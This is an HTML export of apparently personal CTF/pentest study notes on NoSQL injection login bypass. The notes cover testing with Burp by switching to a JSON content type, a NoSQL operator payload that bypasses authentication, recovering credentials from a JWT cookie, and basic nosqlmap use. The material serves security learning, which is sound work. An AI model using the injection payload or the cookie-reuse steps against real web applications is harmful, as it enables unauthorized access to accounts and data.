<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NoSQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>NoSQL</h1><br/><p><h1>Login Bypass</h1></p><p>[CTF 181-182]</p><p></p><p>NoSQL like to use JSON, even if it doesn&#39;t appear that way in the Request.</p><p></p><p><h2>Testing</h2></p><p>Capture login attempts with Burp. If the Request has the former HTTP Header, try switching it to the latter &amp; see if you can throw some errors</p><p></p><p><h3>Baseline</h3></p><p><strong>Content-Type: application/x-www-form-urlencoded</strong></p><p>...</p><p><strong>username=dave&amp;password=admin</strong></p><p></p><p><h3>Edited</h3></p><p><strong>Content-Type: application/json</strong></p><p>...</p><p><strong>username=dave&amp;password=admin</strong></p><p></p><p><span class="subheading">Response</span>: Shows file paths &amp; may / may not indicate that login form can interpret JSON Data?</p><p></p><p><strong>SyntaxError: Unexpected token u in JSON at position 0</strong><strong></strong></p><p><strong>    at JSON.parse (&amp;lt;anonymous&amp;gt;)</strong><strong></strong></p><p><strong>    at createStrictSyntaxError (/home/dave/blog/node_modules/body-parser/lib/types/json.js:158:10)</strong><strong></strong></p><p><strong>    at parse (/home/dave/blog/node_modules/body-parser/lib/types/json.js:83:15)</strong><strong></strong></p><p><strong>    at /home/dave/blog/node_modules/body-parser/lib/read.js:121:18</strong><strong></strong></p><p><strong>    at invokeCallback (/home/dave/blog/node_modules/raw-body/index.js:224:16)</strong><strong></strong></p><p><strong>    at done (/home/dave/blog/node_modules/raw-body/index.js:213:7)</strong><strong></strong></p><p><strong>    at IncomingMessage.onEnd (/home/dave/blog/node_modules/raw-body/index.js:273:7)</strong><strong></strong></p><p><strong>    at emitNone (events.js:106:13)</strong><strong></strong></p><p><strong>    at IncomingMessage.emit (events.js:208:7)</strong><strong></strong></p><p><strong>    at endReadableNT (_stream_readable.js:1064:12)</strong><strong></strong></p><p><strong>    at _combinedTickCallback (internal/process/next_tick.js:138:11)</strong><strong></strong></p><p><strong>    at process._tickCallback (internal/process/next_tick.js:180:9)</strong></p><p>    </p><p><h2>Exploit</h2></p><p>Using Burpsuite, edit Req to use HTTP Header for JSON. Try different <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">payloads</a>.</p><p></p><p><strong>Content-Type: application/json</strong></p><p>...</p><p><strong>{&quot;username&quot;: {&quot;$ne&quot;: null}, “password”: {&quot;$ne&quot;: null}}</strong></p><p></p><p><h3>Bypass via Set-Cookie</h3></p><p>In some cases, this <span style="color:#ff0000;">won&#39;t actually authenticate you</span>, even if it was successful. However, the Resp may contain the <strong>Set-Cookie</strong> header.</p><p></p><p><span class="subheading">Recover Creds from JWT</span>: The Cookie may be serialized data that contains the user&#39;s login credentials, which could be used to <span style="color:#ff0000;">sign-in</span> to the Web App or <span style="color:#ff0000;">elsewhere</span>. For example, you can <a href="Appendix_61.html#jwt">decode a JWT</a>.</p><p></p><p><span class="subheading">Manually Set Cookie</span>: You can try manually injecting this cookie using your Browser DevTools &amp; see if that grants to access</p><p></p><p>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p><p><h1>nosqlmap (NOT FOR OSCP!)</h1></p><p>Can run in interactive mode if you don&#39;t specify any args.</p><p></p><p>★<span style="color:#f66151;text-decoration:underline;">WARNING</span>★: Running in interactive mode clears the terminal!</p><p></p><p><h2>Interactive Mode</h2></p><p>After running <strong>nosqlmap</strong>, need to set options (e.g. Target IP / Hostname) by selecting option <strong>1</strong>.</p></div>
</body>
</html>
